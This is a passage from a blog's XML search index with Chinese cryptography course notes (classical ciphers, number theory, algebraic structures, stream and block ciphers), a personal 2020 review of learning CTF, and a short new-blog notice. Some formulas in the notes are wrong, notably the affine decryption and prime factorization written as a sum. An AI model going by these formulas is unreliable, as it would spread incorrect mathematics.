        <content type="html"><![CDATA[<h1 id="一-密码学概述和古典密码"><a href="#一-密码学概述和古典密码" class="headerlink" title="一.密码学概述和古典密码"></a>一.密码学概述和古典密码</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>密码编码学</strong>和密码分析学</p><blockquote><p>Plaintext:明文，被隐蔽消息，M</p><p>Ciphertext:密文，C</p><p>Encryption:加密</p><p>Decryption:解密，加密的逆过程</p><p>Encryption algorithm: 加密算法，E()</p><p>Decryption algorithm: 解密算法，D()</p><p>Key: 密钥，控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥，k</p></blockquote><ul><li>传统密码体制所用的加密密钥和解密密钥相同或<strong>实质上等同</strong>，从一个易于推出另一个：单钥或对称密码体制，无法实现不可否认性</li><li>加密密钥和解密密钥不相同，从一个难于推出另一个，双钥，或非对称密码体制</li></ul><p>密码体系是一个五元组(M C K E D)</p><p>密钥空间K，在单钥体制下K1 = K2 = K</p><p>加密变换$E_{k1}$</p><p>解密变换$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)为保密通信系统</strong></p><p>密码分析者，选定变换函数h，对c进行变换，得到的明文是明文空间中的某个元素，</p><p>即$m’ = h(x)$</p><p>如果m’ = m，则分析成功</p><h3 id="保密系统基本要求"><a href="#保密系统基本要求" class="headerlink" title="保密系统基本要求"></a>保密系统基本要求</h3><ol><li>理论上不可破，即 $ p_r{m’=m}=0 $，当知道已知的明文密文时，要决定密钥或任意明文在计算上是不可行的</li><li>Kerchhoff原则，保密性不依赖于加密体制或算法的保密，而依赖于密钥</li><li>加密解密算法适用于所有密钥空间中的元素</li><li>系统便于实现和使用</li></ol><h3 id="密码系统的攻击"><a href="#密码系统的攻击" class="headerlink" title="密码系统的攻击"></a>密码系统的攻击</h3><ul><li>惟密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><div class="table-container"><table><thead><tr><th>攻击类型</th><th style="text-align:left">攻击者掌握的内容</th><th></th></tr></thead><tbody><tr><td>惟密文攻击</td><td style="text-align:left">加密算法，截获的部分密文</td><td></td></tr><tr><td>已知明文攻击</td><td style="text-align:left">以上及一个或多个明文密文对</td><td></td></tr><tr><td>选择明文攻击</td><td style="text-align:left">自己选择的明文消息及由密钥产生的密文</td><td></td></tr><tr><td>选择密文攻击</td><td style="text-align:left">自己选择的密文消息及相应的被解密的明文</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>无条件安全：无论敌手截获多少密文，花费多长时间都不能解密密文 （一次一密</p><p>计算上安全：1，破译密文的代价超过被加密信息的价值。2，破译密文所花的时间超过信息的有用期。</p><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><p>Cryptology - 密码学</p><blockquote><p>三个阶段：</p><p>1.1949之前：古典密码 艺术</p><p>2.1949-1975：近代密码 艺术-&gt;科学</p><p>3.1976年至今：现代密码</p></blockquote><p>古典密码：</p><ol><li>斯巴达棍。算法是缠绕，密钥是棍子的粗细。</li><li>单表代换密码：凯撒密码，单字母代换。算法是代换，密钥是密码表。</li><li>多表代换密码：Enigma密码机。</li></ol><p>近代密码：</p><ol><li>1977年，NBS颁布采纳IBM设计的方案作为非机密数据的数据加密标准DES，Data Encryption Standard。</li><li>2001.11.16，采用AES算法</li><li>1976，W.Diffie，M.E.Hellman，提出非对称密码算法思想</li><li>1977，Rivest，Shamir，Adleman提出RSA密码体制</li></ol><p>公钥密码学实现加密密钥和解密密钥的分离，伟大革命，使用两个密钥：公钥，私钥</p><h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>当a和26互为素数的时候才可以解密 最大公因子为1时才互为素数 （不互素的话逆元求不出来，就没法解密</p><p>ab为密钥</p><p>$a^{-1}$为a的逆元</p><h3 id="单表代换优缺点"><a href="#单表代换优缺点" class="headerlink" title="单表代换优缺点"></a>单表代换优缺点</h3><p>频次问题</p><p>相对位置问题</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>加密算法</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.理解保密通信系统模型</p><p>2.密码体制从原理分为两大类，单钥和双钥体制</p><p>3.加密算法两条安全准则</p><p>4.能够计算仿射变换</p><p>5.置换密码的操作</p><h1 id="二-密码学相关数学知识"><a href="#二-密码学相关数学知识" class="headerlink" title="二.密码学相关数学知识"></a>二.密码学相关数学知识</h1><h2 id="1-素数和互素"><a href="#1-素数和互素" class="headerlink" title="1.素数和互素"></a>1.素数和互素</h2><ul><li><p>因子</p><ul><li>b能整除a，b|a : b是a的因子</li><li>b|1    b = $\pm$1</li><li>b|a a|b 则 a=$\pm$b</li><li>b|a  b|c. 则对于任意整数m和n  -&gt; b|(am+cn)</li></ul></li><li><p>素数</p><ul><li>素数是现代数论的核心内容</li><li>p的因子只有 $\pm$1和 $\pm$p</li><li>整数分解的唯一性定理 任一正整数可以唯一分解成素数的乘积<ul><li>$a = p_1^{e_1} + p_2^{e_2} + … + p_t^{e_t}$</li><li>$e_i$是正整数 $p_i$是素数</li></ul></li></ul></li><li><p>互素数 </p><ul><li>c是a和b的最大公因子 c=gcd(a,b)</li><li>因为所有不为0的整数都是0的因子，因此，gcd(a,0) = |a|</li><li><p>如果gcd(a,b) = 1，则称a，b是互素的</p></li><li><p>最小公倍数 lcm。d是a和b的最小公倍数，d=lcm(a,b)</p></li><li>若gcd(a,b) = 1，则lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-模运算"><a href="#2-模运算" class="headerlink" title="2.模运算"></a>2.模运算</h2><ul><li><p>数论</p><ul><li><p>是密码学特别是公钥密码学的基本工具</p></li><li><p>离散的数字集合</p></li><li><p>运算是模加，模减，逆运算</p></li><li><p>对整数和多项式进行模运算</p></li><li><p>字母的通用表示：</p><ul><li>n: 非负整数</li><li><p>p: 素数</p></li><li><p>Z: 整数集合</p></li><li>R: 实数集合</li><li><p>Q: 有理数集合</p></li><li><p>$Z_n$ = {0,1,2…n-1}小于n的非负整数集合</p></li></ul></li></ul></li><li><p>模运算</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>同余</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) 等价a $\equiv$ b mod n</li></ul></li><li><p>同余性质</p><ul><li>a $\equiv$ b mod n，则b $\equiv$ a mod n</li><li>a $\equiv$ b mod n，b $\equiv$ c mod n，则a $\equiv$ c mod n</li><li>a $\equiv$ b mod n，d｜n，则a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ， d = lcm($n_1,n_2,…n_k$)，则a $\equiv$ b mod d，(i = 1,2,…,k)</li></ul></li><li><p>同余类/等价类/模n剩余类</p><ul><li>与a模n同余的全体成为a的同余类记为$[a]_n$</li><li>$Z_n$为模n的等价类集合</li></ul></li><li><p>等价类性质</p><ul><li>在做mod n的加法和乘法时，等价类的元素可以替换，结果不变</li></ul></li><li><p>模运算性质</p><ul><li>加运算和乘运算先做模和后做模不影响结果</li><li>满足交换律，结合律，分配律</li><li>单位元，0是加法单位元，1是乘法单位元</li></ul></li></ul><h2 id="3-模指数运算"><a href="#3-模指数运算" class="headerlink" title="3.模指数运算"></a>3.模指数运算</h2><p>模指数运算</p><ul><li>$a^m \pmod p$</li><li>思路：现将m用二进制表示</li><li>？快速指数运算查询</li><li>阶 $ord_n(a)$， 满足 $a^m \equiv $ 1 mod n 的最小正整数m为模n下a的阶</li><li>$ord_n(a)$ = m，$ a^k \equiv 1$ mod n的充要条件是k为m的倍数</li></ul><h2 id="4-费马定理和欧拉定理"><a href="#4-费马定理和欧拉定理" class="headerlink" title="4.费马定理和欧拉定理"></a>4.费马定理和欧拉定理</h2><ul><li>费马定理<ul><li>p是素数，a是正整数，且gcd(a,p) = 1,则$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p 或者 $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (满足费马定理，即$2^{12} \equiv 1$ mod 13，即$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-素性检测"><a href="#5-素性检测" class="headerlink" title="5.素性检测"></a>5.素性检测</h2><p>素性检测就是对给定的数检验是否为素数</p><p>费马定理的逆命题不成立，伪素数（卡米歇尔数）</p><ul><li>埃拉托斯散筛法</li><li><p>Miller-Rabin概率检测法</p><h2 id="6-欧几里得算法"><a href="#6-欧几里得算法" class="headerlink" title="6.欧几里得算法"></a>6.欧几里得算法</h2></li></ul><p>辗转相除法</p><h2 id="7-中国剩余定理"><a href="#7-中国剩余定理" class="headerlink" title="7.中国剩余定理"></a>7.中国剩余定理</h2><p>小数重构大数</p><p>大数用小数表示</p><h2 id="8-群环域"><a href="#8-群环域" class="headerlink" title="8.群环域"></a>8.群环域</h2><ul><li><p>代数系统</p><ul><li>代数系统是一种数学模型，包含要处理的数学对象的集合及集合上的关系或运算。</li><li>群，环，域都是代数系统。</li></ul></li><li><p>半群</p><ul><li>任取ab属于S，a和b的运算*都在S中，则S对运算*是封闭的</li><li>满足结合律</li><li>满足以上两点，称为<G,*>为半群</li></ul></li><li><p>群</p><ul><li>封闭性</li><li>结合律</li><li>单位元：$a<em>e = e</em>a = a$，e称为$<G,*>$的单位元</li><li>逆元：对任取a属于G，存在元素$a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>满足以上几点称为$<G,*>$是群</li><li>实例 $<Z_8,+>$，模8加</li><li>实例 XOR，模2加</li><li>实例，加法群<ul><li>对任意n大于等于1，整数模n的集合构成一个包含n个元素的有限模n加法群，单位元是0，群中任一元素a，它的逆元是n-a，这个群记为$Z_n$</li></ul></li><li><p>实例，乘法群不是群，是幺半群，不满足逆元的条件</p></li><li><p>乘法群 $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$，小于n的非负整数且与n互素</li><li>模n乘法群，单位元e = 1</li><li>是abel群，$|Z_n^*| = \psi(n)$</li><li>对素数p，$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abel群</p><ul><li>运算*表示加法时，称为加法群</li><li>乘法，乘法群</li><li>若G的元素是有限的，称为有限群，否则为无限群</li><li>有限群中，G的元素个数称为群G的阶数，表示为$|G|$ or $#G$</li><li>还满足交换律，则称为群$<G,*>$为Abel群</li><li><p>密码学中用到的几乎都为Abel群</p></li><li><p>实例 $<Z_8,+>$，模8加，阶为8</p></li></ul></li></ul><ul><li>循环群<ul><li>$g^i = a$，a为任意的一个元素，g为生成元或本原元</li><li>即能够自己对自己做运算，最终能够遍历群</li><li>实例<ul><li>$Z_4$</li><li>$Z_p^*$，p为素数，肯定存在生成元<ul><li>定理$Z_n^*$每一个元素都有乘法逆元</li><li>并不是每一个元素都是生成元</li></ul></li></ul></li><li>本原元的存在性<ul><li>对模素数p<ul><li><ol><li>其生成元必定存在</li><li>当g为生成元且p与p-1互素时，$g^a$  mod p也是生成元</li><li>生成元个数为$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>元素的阶<ul><li>拉格朗日定理推论，提供了群的阶和群中元素阶的关系</li></ul></li></ul><ul><li>环<ul><li>$<R,+>$是Abel群</li><li>$<R,*>$是半群</li><li>分配律</li><li>$<R,+,*>$是环</li></ul></li></ul><ul><li>域<ul><li>$<F,+>$ 是Abel群，0是+的单位元</li><li>$<F-0,*>$ 是Abel群</li><li>分配律</li><li>$<F,+,*>$是域</li></ul></li></ul><ul><li>有限域<ul><li>若q是素数的幂，即$q = p^n$ ，p是素数，n是正整数，则阶为q的域记为GF(q)</li></ul></li></ul><h2 id="9-离散对数"><a href="#9-离散对数" class="headerlink" title="9.离散对数"></a>9.离散对数</h2><h2 id="10-平方剩余"><a href="#10-平方剩余" class="headerlink" title="10.平方剩余"></a>10.平方剩余</h2><h2 id="11-小结"><a href="#11-小结" class="headerlink" title="11.小结"></a>11.小结</h2><h1 id="三-应用密码学"><a href="#三-应用密码学" class="headerlink" title="三.应用密码学"></a>三.应用密码学</h1><h2 id="1-流密码"><a href="#1-流密码" class="headerlink" title="1.流密码"></a>1.流密码</h2><p>流密码的基本思想：利用密钥k产生一个密钥流，使用规则对明文串加密</p><p>与维吉尼亚类似，多表代换密码</p><p>密钥流通过密钥发生器f产生</p><p> $z_i = f(k,\theta_i)$</p><p>分组密码和流密码的区别在于有无记忆性</p><p>流密码的滚动密钥，由函数f，密钥k和初始状态西格玛完全确定。此后，输入的密文可能影响加密器中内部记忆元件的存储状态，因而可能依赖<strong>于所有输入</strong>的影响。</p><p>可分为同步和自同步两种</p><p>对称密码体制</p><p>同步流密码的变换$E_i$可以有多种选择，只要变换即可逆即可。</p><p>二元加法流密码是最常用的流密码的体制。即异或。</p><p>密钥流序列Z应该具有如下性质</p><ul><li>极大的周期</li><li>良好的统计特性</li><li>抗线性分析</li><li>抗统计分析</li></ul><h3 id="有限状态自动机"><a href="#有限状态自动机" class="headerlink" title="有限状态自动机"></a>有限状态自动机</h3><p>是具有离散输入和输出的一种数学模型，由三部分组成</p><ol><li>有限状态集</li><li>有限输入字符集，有限输出字符集</li><li>转移函数</li></ol><h3 id="密钥流产生器"><a href="#密钥流产生器" class="headerlink" title="密钥流产生器"></a>密钥流产生器</h3><p>关键是密钥流产生器。一般可将其看成为参数为k的有限状态自动机，有输出符号集，一个状态集，和两个函数以及一个初始状态组成</p><p>两个函数为状态转移函数和字符输出函数</p><p>LFSR：线性反馈移位寄存器</p><p>最大周期为2的n次方减1，n是几级寄存器</p><h2 id="2-分组密码体制"><a href="#2-分组密码体制" class="headerlink" title="2.分组密码体制"></a>2.分组密码体制</h2><p>对称密码体制</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li><p>加密解密</p></li><li><p>构成其他加密算法的组成元素</p></li></ul><ul><li>明文</li><li>明文分组</li><li>密钥</li><li>密文分组</li><li>加密函数</li></ul><p>通常取密文分组数量和明文分组数量相等</p><ul><li>要求<ul><li>分组长度n足够大，防止明文穷举攻击法</li><li>密钥量足够大，即置换子集中的元素足够多，以防止密钥穷举攻击，但又不能过长，管理问题</li><li>由密钥确定置换的算法要足够复杂</li><li>加密和解密运算简单，易于软件和硬件高速实现</li></ul></li></ul><h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2.DES"></a>2.DES</h3><p>密钥长度为56位</p><h3 id="3-分组密码体制的运行模式"><a href="#3-分组密码体制的运行模式" class="headerlink" title="3.分组密码体制的运行模式"></a>3.分组密码体制的运行模式</h3><h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><h3 id="5-AES"><a href="#5-AES" class="headerlink" title="5.AES"></a>5.AES</h3>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年度总结</title>
      <link href="2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-3月"><a href="#1-3月" class="headerlink" title="1-3月"></a>1-3月</h2><p>1-3月啥也不会，铁fw罢了，在学校摸摸鱼，电子人，电脑小白-.-</p><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><p>接触网络安全源于一个电影，挺感兴趣的，在全网搜索相关文献资料啥的，也啥也不会，后来发现ctf比赛，想着学学吧，从web安全开始了，记得一开始是听的哔哩哔哩课程，什么从入门到入狱啥的，师傅其实讲的很好，那个时候学会了sql注入，xss啥的，不过只知道原理，并不会相关操作。<br>后来发现一个网站叫bugku，开始刷题了，一开始过程是自闭的，什么f12都不会，然后开始陆陆续续学JavaScript前端啥的，php和mysql也简单学学，后来面向wp做题有了一点点感觉。</p><h2 id="4-5月"><a href="#4-5月" class="headerlink" title="4-5月"></a>4-5月</h2><p>由于疫情的爆发没有开学，上网课，就很nice，然后就不听课，开始疯狂自学做题，当时啥都学早6点到晚12点左右，python php JavaScript linux …… 反正就是什么都会一点但是不精细。<br>后来打比赛，直接自闭了，认识了堆堆师傅，当时堆堆师傅主方向是web副方向是pwn，很羡慕，太羡慕pwn👴👴了，然后堆堆告诉我一个网站叫buuoj，让我开始做那个东西，然后就开始入坑buu了，记得第一道题好像是目录穿越还是反序列化不太记得了，从白天一直做到凌晨，各种抄wp复现，打击太大了，然后堆堆师傅凌晨4点多教我怎么做呜呜呜太感动了，然后告诉我说极客大挑战系列的题目比较简单，我就开始挑简单题做。然后从哔哩哔哩疯狂听课，后来学了两周misc，在MRCTF新生赛上出了一两个web和四五道misc，太满足了，第一次找到成就感，然后后来一个啥比赛又整自闭了。然后进入迷茫期。中间我帮七星师傅了录了一期长亭科技师傅做的pwn课程，那是什么鬼啊从头到尾全程懵逼，就硬生生给👴听睡着了。</p><h2 id="6-7月"><a href="#6-7月" class="headerlink" title="6-7月"></a>6-7月</h2><p>下学期快考试了，然后转专业啥的，由于上学期成绩还可以，然后就想着转个专业8，本来是想选网安的，但是竟然不能转因为是新开的专业啊可恶，然后又想转计科，但是看到人才培养方案发现网络专业竟然有安全课于是来到了网络专业，后话了（<br>然后快考试了，啥也没学这学期，开始疯狂补课，电路从第三章👴就没听懂过，猴博士yyds，高数二边听课边玩游戏，高数叔yyds。最终都考的还行。然后web方向面临瓶颈了，开始过渡pwn。<br>没有课程，从汇编开始学，贼痛苦，晚上做梦都是噩梦。反正那段时间挺难受的。<br>用了一段时间把wiki上的大部分栈知识点搞定之后开始冲刺堆部分。<br>怎么说呢，堆部分刚开始对于👴来说简直是地狱。没有学过数据结构，文献看不懂，又没有视频资料，七星师傅群里也没有pwn手，就很难受，当时星盟的一个师傅出了一套pwn课程，堆部分只有一丢丢，但是很满足了，慢慢啃wiki，最后还是学到了很多东西。</p><h2 id="8-9月"><a href="#8-9月" class="headerlink" title="8-9月"></a>8-9月</h2><p>旅游，各种玩耍，咕了</p><h2 id="9-12月"><a href="#9-12月" class="headerlink" title="9-12月"></a>9-12月</h2><p>下学期开始了，新班级，带了一个舍友开始学ctf，同班同学碰见一个特别强的师傅，后来认识了一下才知道这个师傅是计算机大类的系第一，高中就开始搞技术了，web手，膜。然后继续pwn，基本上一天两到三个buu吧，不会就记录查wp，技术上是有一定进步的，然后打了省的一个小比赛拿了一个二等奖，后来跟web师傅组队又打了一个线下赛拿了第一名，挺满意的。然后陆陆续续做题，把buu的一分pwn做完了，当时pwn总榜排名也进入前50了，然后就是复习课准备考试了，中间还成立了我们校的第一个ctf社团，感谢各位老师的支持和帮助</p><h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><p>最终寒假来了，摸了一个寒假，学了几天的运维</p><p>2021开学了，准备继续学pwn，堆部分还没有结束，还是跟师傅们差的太远，不过这一年认识很多hxd，校内师傅不用说了，堆堆师傅，七星师傅，雪殇师傅，Mz1师傅，Fz师傅，N神，低调的L0ne1y师傅等等，路很长，加油，共勉！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>New</title>
      <link href="2021/03/05/New/"/>
      <url>2021/03/05/New/</url>
      
        <content type="html"><![CDATA[<h3 id="新博客！"><a href="#新博客！" class="headerlink" title="新博客！"></a>新博客！</h3><p>原博客地址：<a href="https://cnblogs.com/lemon629/">https://cnblogs.com/lemon629/</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
